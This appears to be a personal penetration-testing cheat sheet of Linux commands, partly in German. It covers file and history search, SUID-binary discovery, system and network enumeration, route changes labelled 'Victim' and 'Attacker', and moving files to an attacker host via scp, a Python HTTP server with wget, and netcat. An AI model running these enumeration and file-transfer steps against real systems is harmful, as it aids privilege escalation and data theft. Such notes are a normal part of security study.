## Useful Commands I don't know:
### Files:

```bash
# Klartextsuche
find / -iname "test" -type f/d/l/s
```

```bash
# Pipes:
# ------
# Überschreibung:
echo "hey" > test.txt
# Anhängen:
echo "hey" >> test.txt
```

```bash
# Suche in Dateien
grep -i "text" .bash_history
```

```bash
# Unterschied zwischen 2 Dateien
comm test_1.txt test_2.txt
vim -d
```

```bash
# Ausgabe ersten Zeilen
head -n 3
```

```bash
# Ausgabe letzten Zeilen
tail -n 3
```

```bash
# Find files with SUID bit set:
find / -user root -perm -4000 -print 2>/dev/null | head -20
```

### System information:

```bash
# Finden von Programmen
which

# Aktueller User
whoami
```

```bash
# Kernel Version
uname -a

cat /etc/issue
```

```bash
# Rechte von user
id
```
### Network information

```bash
# See open ports
netstat -alnu
```

Add Gateway (if subnet is not reachable). The host 192.168.1.2 can reach 192.168.1.1 (The proxied Webserver) but not 192.168.2.0/24 and therefore not 192.168.2.2 (The machine):
```bash
# Victim:
ip route add 192.168.1.2 via 192.168.1.1

# Attacker:
ip route add 192.168.2.2 via 192.168.1.1
```

```bash
# See all open connections
lsof -ai -p "$pid"
```

```bash
# Find IP for Domain
nslookup domain.local

whois domain.local
```
## File Transfer:

#### SCP:

Step 1: Enable SSH on Attacker
```bash
sudo apt update

sudo apt install openssh-server

sudo systemctl start ssh

sudo systemctl enable ssh
```

Step 2: Download file via SCP:
```bash
scp file.txt kali@192.168.1.2:/home/kali
```


(Upload):
```bash
scp kali@192.168.1.2:/home/kali/file.txt
```

#### Python:

Step 1: HTTP Server on Attacker (or victim if upload):
```bash
python -m http.server 9000
```

Step 2: Download file:
```bash
wget 192.168.1.2:9000/file.txt
```

#### NC:

Step 1: Create listener on receiver:
```bash
nc -lvnp 4444 > file.txt
```

Step 2: Send file:
```bash
nc 192.168.1.2 4444 < file.txt
```